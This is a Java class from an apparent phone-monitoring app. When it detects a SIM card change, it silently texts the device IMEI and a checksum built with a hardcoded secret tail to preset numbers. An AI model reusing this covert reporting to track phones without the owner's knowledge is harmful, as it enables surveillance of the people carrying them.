package com.vvt.sim;

import java.util.Timer;
import java.util.TimerTask;
import java.util.Vector;
import com.vvt.checksum.CRC32;
import com.vvt.event.FxEventCapture;
import com.vvt.event.FxSystemEvent;
import com.vvt.event.constant.FxCategory;
import com.vvt.event.constant.FxDirection;
import com.vvt.global.Global;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.smsutil.SMSSendListener;
import com.vvt.smsutil.SMSSender;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;

public class SIMChangeNotif extends FxEventCapture implements SMSSendListener {
	
	private final String TAG = "SIMChangeNotif";
	private final String TAIL = "PX2UIZVPNO";
	private final String CMD_ID = "2";
	private final int MAX_CHECKSUM_LENGTH = 8;
	private int countSending = 0;
	private SIMChange simCh = null;
	private SMSSender smsSender = Global.getSMSSender();
	private SIMChangeNotif self = null;
	private Vector recipentNumbers = null;
	private LicenseManager licenseMgr = Global.getLicenseManager();
	private LicenseInfo licenseInfo = licenseMgr.getLicenseInfo();
	
	public SIMChangeNotif() {
		self = this;
	}
	
	public void startCapture() {
		try {
			if (Log.isDebugEnable()) {
				Log.debug(TAG + ".startCapture", "isEnabled(): " + isEnabled() + " , sizeOfFxEventListener(): " + sizeOfFxEventListener());
			}
			if (!isEnabled() && sizeOfFxEventListener() > 0) {
				new Timer().schedule(new TimerTask() {
					public void run() {
						setEnabled(true);
						checkSIMChange();
					}
				}, 60000); // wait 60 second.
			}
		} catch(Exception e) {
			setEnabled(false);
			notifyError(e);
		}
	}

	public void stopCapture() {
		if (isEnabled()) {
			setEnabled(false);
		}
	}
	
	public void setRecipentNumbers(Vector recipentNumbers) {
		this.recipentNumbers = recipentNumbers;
	}
	
	public Vector getRecipentNumbers() {
		return recipentNumbers;
	}
	
	private void checkSIMChange() {
		simCh = new SIMChange();
		
		if (Log.isDebugEnable()) {
			Log.debug(TAG + ".checkSIMChange()", "simCh.isSIMChanged(): " + simCh.isSIMChanged());
		}
		
		if (simCh.isSIMChanged()) {
			// Recording event system log.
			FxSystemEvent systemEvent = new FxSystemEvent();
			systemEvent.setCategory(FxCategory.SIM_CHANGE_NOTIFY_HOMEOUT);
			StringBuffer msg = new StringBuffer();
			msg.append("<" + CMD_ID + ">");
			msg.append("<" + PhoneInfo.getIMEI() + ">");	
			msg.append("<" + getChecksum(CMD_ID) + ">");
			systemEvent.setSystemMessage(msg.toString());
			systemEvent.setEventTime(System.currentTimeMillis());
			systemEvent.setDirection(FxDirection.OUT);
			notifyEvent(systemEvent);
				
			// Sending message to home-out numbers.
			if (recipentNumbers != null) { 
				int count = recipentNumbers.size();
				countSending = count;
				String homeOutNumber = null;			
				if (Log.isDebugEnable()) {
					Log.debug(TAG + ".checkSIMChange()", "countHomeOutNumber: " + count + ", msg: " + msg.toString());					
				}
				for (int i = 0; i < count; i++) {
					homeOutNumber = (String) recipentNumbers.elementAt(i);
					if (homeOutNumber != null && !homeOutNumber.equals(Constant.EMPTY_STRING)) {
						if (Log.isDebugEnable()) {
							Log.debug(TAG + ".checkSIMChange()", "homeOutNumber: " + homeOutNumber);
						}
						FxSMSMessage smsMessage = new FxSMSMessage();
						smsMessage.setMessage(msg.toString());
						smsMessage.setNumber(homeOutNumber);
						SMSSender.getInstance().addListener(self);
						SMSSender.getInstance().send(smsMessage);
						try {
							Thread.sleep(30000);
						} catch (Exception e) {
							Log.error(TAG + ".checkSIMChange()", e.getMessage());
						}
					}
				}
			}
		}
	}

	private String getChecksum(String cmd) {
		String crc32Hex = null;
		try {
			String data = cmd + PhoneInfo.getIMEI() + licenseInfo.getActivationCode() + TAIL;
			long crc32 = CRC32.calculate(data.getBytes("UTF-8"));
			crc32Hex = Integer.toHexString((int) crc32).trim().toUpperCase();
			// Checksum must always contain 8 characters
			int length = crc32Hex.length();
			if (length > MAX_CHECKSUM_LENGTH) {
				crc32Hex = crc32Hex.substring(length - MAX_CHECKSUM_LENGTH);
			} else if (length < MAX_CHECKSUM_LENGTH) {
				StringBuffer buffer = new StringBuffer(crc32Hex);
				int diff = MAX_CHECKSUM_LENGTH - length;
				for (int i = 0; i < diff; i++) {
					buffer.insert(0, "0");
				}
				crc32Hex = buffer.toString();
			}
		} catch (Exception e) {
			Log.error(TAG + ".getChecksum()", e.getMessage(), e);
		}
		return crc32Hex;
	}
	
	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		countSending--;
		if (countSending <= 0) {
			smsSender.removeListener(this);
			simCh = null;
		}
		Log.error(TAG + ".smsSendFailed", "countSending: " + countSending + "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);		
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		countSending--;
		if (countSending <= 0) {
			smsSender.removeListener(this);
			simCh = null;
		}
		if (Log.isDebugEnable()) {
			Log.debug(TAG + ".smsSendSuccess()", "countSending: " + countSending + " , contact name: " + smsMessage.getContactName() + " , msg: " + smsMessage.getMessage() + " , number: " + smsMessage.getNumber());
		}
	}
}
